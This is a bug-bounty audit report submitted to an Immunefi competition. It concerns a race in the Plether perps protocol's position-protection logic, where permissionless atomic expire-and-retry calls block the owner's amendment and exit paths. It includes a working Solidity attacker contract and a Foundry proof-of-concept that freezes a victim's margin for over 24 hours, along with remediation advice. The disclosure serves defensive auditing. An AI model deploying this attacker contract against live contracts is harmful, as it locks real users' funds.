# \#97592 [SC-High] Permissionless atomic protection retries prevent owners from repairing close limits and freeze position margin for over 24 hours

**Submitted on Nov 2nd 2026 at 14:03:28 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97592
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

When a protected close expires or fails, the protection briefly enters `Latched`, the only state in which its owner can repair stale financial limits. However, any account can retry the close from that same state. An attacker contract can therefore expire the child and retry it atomically, consuming the owner's amendment state before any owner transaction can interleave. Repeating this at each public deadline keeps an impossible close live, blocks every voluntary exit path, and leaves the owner's position and margin locked for more than 24 hours.

## Vulnerability Details

`amendLatchedPositionProtectionCloseLimits` is intentionally owner-only. It accepts an amendment only while the protection is `Latched` and the account has no pending order:

```solidity
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
    revert OrderRouter__PendingOrdersExist();
}
```

The problem is that `retryPositionProtectionClose` is permissionless and consumes exactly the same transient state:

```solidity
StoredProtection storage protection = _activeProtection(protectionId);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
    revert OrderRouter__ProtectionNotLatched();
}
// ...
linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
    .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
_recordCloseAttempt(protection, linkedOrderId);
```

A failed or expired registered attempt synchronously moves `Triggered -> Latched` in `handleFailedProtectionAttempt`. Both `executeOrder` and `expireOrder` are public and perform this callback before returning. Consequently, an arbitrary attacker contract can atomically execute either a known-to-fail child or an expired child and immediately retry:

```solidity
keeper.expireOrder(expiredOrderId);                            // Triggered -> Latched
// or: keeper.executeOrder(liveOrderId, pythUpdateData);        // typed constraint failure -> Latched
protectionActions.retryPositionProtectionClose(protectionId); // Latched -> Triggered
```

Both calls occur in one transaction. Although `Latched` exists during execution, there is no transaction boundary in which the owner can amend the limits. The replacement child receives the unchanged retained limits.

This becomes a fund freeze because the protocol also removes the owner's alternative exit paths:

- amendment rejects the new `Triggered` state with `ProtectionNotLatched`;
- normal protection cancellation supports only `PendingOpen` or `Armed`;
- `cancelPositionProtectionAndCommitClose` also requires `Armed`; and
- an ordinary close is rejected with `ProtectionActive` while the protection remains active.

The maximum permitted execution window is one hour. Every replacement receives a fresh deadline. An attacker can submit the same atomic expiry/retry transaction at each known deadline; 24 repetitions keep the lock continuous for more than 24 hours and leave another impossible child live afterward.

The previously documented protection-limit fix does retain the owner's limits correctly. This report does not claim that a retry omits or relaxes those limits. The distinct issue is that an untrusted retry caller can atomically consume the only state in which the advertised owner amendment is legal, making the repair mechanism unusable.

The canonical entrypoint guide describes owner amendment in `Latched` as changing the limits used for a future retry, and the protocol's agent guide states that after a close fails, “the owner may amend its limits before retrying.” Neither describes owner recovery as a race that any retry caller may atomically preempt.

The security documentation separately states that triggering is irreversible and retry is permissionless. This finding does not dispute either rule in isolation. It is the undocumented interaction with the owner-only amendment mechanism: an untrusted caller can compose public cleanup and retry in one transaction so the documented “amend before retry” recovery state is never externally usable.

### Known-issue review

No exact duplicate or accepted instance of this atomic amendment-starvation issue was found in:

- all five supplied private-audit reports;
- the root or perps `SECURITY.md` files;
- package READMEs;
- the canonical entrypoint and AI-agent documentation; or
- the public [Plether documentation](https://docs.plether.com/).

The closest prior-audit issue concerned retries failing to retain the trader's financial limits. That issue is not repeated here: the PoC confirms that the limits are retained correctly. The distinct root cause is that an untrusted caller can atomically consume the owner-only amendment state added to make those retained limits repairable.

The safest remediation is to give the owner an exclusive amendment interval after each relatch and enable permissionless retry only after that interval. Alternatively, allow the owner to stage replacement limits while a child is `Triggered` and atomically apply them to the next retry.

## Impact Details

The selected in-scope impact is **Temporary freezing of funds for at least 24 hours**.

The PoC opens a real position through the protocol and triggers a protected close with a now-unusable execution-notional ceiling. An explicit attacker contract first executes that child, proves it terminally fails on the `ExecutionNotional` constraint, and retries in the same transaction. It then runs 24 atomic expiry/retry cycles under the valid one-hour execution-window configuration. After more than 24 hours:

- the full position size is still involuntarily open;
- the same nonzero amount of user margin remains locked in the position;
- the stale financial limits are still attached to the live child;
- the owner cannot amend, cancel, submit an ordinary close, or use the atomic cancel-and-close function; and
- one replacement protected close remains pending, extending the lock into the next hour.

The freeze does not depend on favorable price movement or on stealing funds. Price movement, carry, and liquidation risk can make the owner's eventual economic loss larger, but those secondary losses are not needed for the claimed impact.

Maintaining the freeze requires the attacker transaction to be ordered before an owner's recovery transaction at each public deadline. Once an attack transaction is included, however, its expiry and retry calls are atomic and the owner cannot intervene between them.

## References

- [`PositionProtectionBook.amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328)
- [`PositionProtectionBook.retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)
- [`PositionProtectionBook.handleFailedProtectionAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L667)
- [`PositionProtectionBook` cancellation-state guards](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L428)
- [`OrderRouter.expireOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191-L195) and [`OrderRecoverySidecar.expireOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L49-L64)
- [`OrderLiquidationBatchLogic` active-protection lock](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L302-L315)
- [`OrderRouterAdmin` one-hour maximum execution window](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterAdmin.sol#L29-L31)
- [`CANONICAL_ENTRYPOINTS.md` owner amendment and permissionless retry semantics](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L143-L148)
- [`WORKING_WITH_AI_AGENTS.md` failed-attempt recovery sequence](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L280-L288)
- [`perps-aa-client/README.md` owner amendment before permissionless retry](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa-client/README.md#L199-L207)
- [`perps/SECURITY.md` irreversible trigger and permissionless retry design](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L561)

## Proof of Concept

## Proof of Concept

### What the end-to-end PoC proves

This is an end-to-end protocol-level PoC: it demonstrates the complete stated impact through Plether's actual implementation contracts and public entrypoints, from opening the victim position through the final locked-margin state:

- a real position is opened through the Plether perps stack;
- the protected close genuinely fails with the typed `ExecutionNotional` constraint;
- the attacker retries in the same transaction, atomically consuming `Latched`;
- the attacker repeats the atomic expiry/retry across 24 one-hour deadlines;
- more than 24 hours elapse while the full position and the same nonzero margin remain locked;
- amendment, cancellation, ordinary close, and atomic cancel-and-close all revert; and
- another impossible protected close remains pending afterward, extending the freeze.

The test inherits Plether's official position-protection fixture. `MockPyth` and the test settlement token stand in only for external dependencies. The vulnerable Router, Engine, lifecycle Book, position-protection Book, clearinghouse, and settlement paths are the real protocol implementations. The PoC does not write protocol storage artificially, replace a vulnerable protocol contract with a mock, or fabricate an unreachable state.

Save the following file as `packages/perps/test/perps/spec/trader/PositionProtectionAtomicRetryRace.t.sol` in the frozen repository:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "./PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @dev Both calls execute in one production-reachable transaction. No EOA can
///      amend the protection between the expiry callback and the fresh retry.
contract AtomicProtectionRetryAttacker {

    function executeFailedCloseAndRetry(
        IPerpsKeeper keeper,
        IPositionProtectionActions protectionActions,
        uint64 liveOrderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
        result = keeper.executeOrder{value: msg.value}(liveOrderId, pythUpdateData);
        retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(
        IPerpsKeeper keeper,
        IPositionProtectionActions protectionActions,
        uint64 expiredOrderId,
        uint64 protectionId
    ) external returns (uint64 retryOrderId) {
        keeper.expireOrder(expiredOrderId);
        retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
    }

}

contract PositionProtectionAtomicRetryRaceTest is PositionProtectionTest {

    function test_AtomicRetryCanBlockOwnerRecoveryAndExitForMoreThan24Hours() public {
        _startRecordingLogs();
        // One hour is an explicitly valid production configuration. Using the
        // maximum makes the 24-hour impact visible with only 24 real cycles.
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 1 hours;
        _setRouterConfig(config);
        _refreshMark(MARK_PRICE);

        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        // The original close cannot execute under this stale ceiling. The
        // intended recovery is for Alice to amend it while status == Latched.
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;

        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(params);
        uint64 liveAttemptId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        (, uint256 marginLockedBeforeAttack,,,,,) = engine.positions(ALICE);
        uint256 attackStartedAt = vm.getBlockTimestamp();

        AtomicProtectionRetryAttacker attacker = new AtomicProtectionRetryAttacker();

        // Prove that the retained ceiling really makes the close terminally
        // fail, then consume the resulting Latched state in the same attacker
        // transaction. This is the race; expiry is only one repeatable source
        // of the same transient state.
        uint64 failedAttemptId = liveAttemptId;
        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        OrderV3Types.ExecutionResult memory failedResult;
        (failedResult, liveAttemptId) = attacker.executeFailedCloseAndRetry(
            IPerpsKeeper(address(router)), protectionActions, failedAttemptId, protectionId, executionData
        );
        assertEq(uint8(failedResult.status), uint8(OrderV3Types.LifecycleStatus.Failed), "bounded close must fail");
        assertEq(
            uint8(failedResult.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "execution-notional ceiling must terminally reject the close"
        );
        OrderV3Types.CompactOutcome memory failedOutcome =
            _verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), failedAttemptId);
        assertEq(
            uint8(failedOutcome.failedConstraint),
            uint8(OrderV3Types.ConstraintKind.ExecutionNotional),
            "receipt must identify the stale execution-notional ceiling"
        );
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "attacker atomically consumes the first failed attempt's Latched state"
        );
        _assertPendingCloseLimits(liveAttemptId, params.closeLimits);

        // At every public deadline, the attacker atomically expires the child
        // (which relatches the protection) and consumes that Latched state by
        // creating the next child. Alice has no transaction boundary in which
        // she can call amendLatchedPositionProtectionCloseLimits.
        for (uint256 cycle; cycle < 24; ++cycle) {
            uint64 deadline = router.lifecycleBook().orderTiming(liveAttemptId).executionDeadline;
            vm.warp(uint256(deadline) + 1);

            liveAttemptId =
                attacker.expireAndRetry(IPerpsKeeper(address(router)), protectionActions, liveAttemptId, protectionId);

            PositionProtectionTypes.PositionProtectionView memory protection =
                protectionViews.getPositionProtection(protectionId);
            assertEq(
                uint8(protection.status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "attacker immediately consumes the Latched amendment state"
            );
            assertEq(protection.linkedOrderId, liveAttemptId, "fresh hostile retry stays live");
            _assertPendingCloseLimits(liveAttemptId, params.closeLimits);
        }

        assertGt(
            vm.getBlockTimestamp() - attackStartedAt, 24 hours, "close path has remained blocked for over 24 hours"
        );

        PositionProtectionTypes.CloseFinancialLimits memory executableLimits =
            PositionProtectionTypes.CloseFinancialLimits({
                maxExecutionNotionalAssets: 25_000e6,
                maxGrossAccountDebitAssets: 25_000e6,
                maxActionChargeAssets: 25_000e6,
                maxExplicitFeesAssets: 25_000e6
            });

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, executableLimits);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(manualClose);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);

        (uint256 remainingSize, uint256 lockedMarginAssets,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "the full position remains involuntarily open");
        assertEq(lockedMarginAssets, marginLockedBeforeAttack, "the position margin remains locked");
        assertGt(lockedMarginAssets, 0, "the attack keeps nonzero user funds in the position");
        assertEq(router.pendingOrderCounts(ALICE), 1, "the attacker keeps one impossible close live");
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-contract PositionProtectionAtomicRetryRaceTest \
  --match-test test_AtomicRetryCanBlockOwnerRecoveryAndExitForMoreThan24Hours -vv
```

Expected output:

```text
Ran 1 test for test/perps/spec/trader/PositionProtectionAtomicRetryRace.t.sol:PositionProtectionAtomicRetryRaceTest
[PASS] test_AtomicRetryCanBlockOwnerRecoveryAndExitForMoreThan24Hours() (gas: 23093560)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

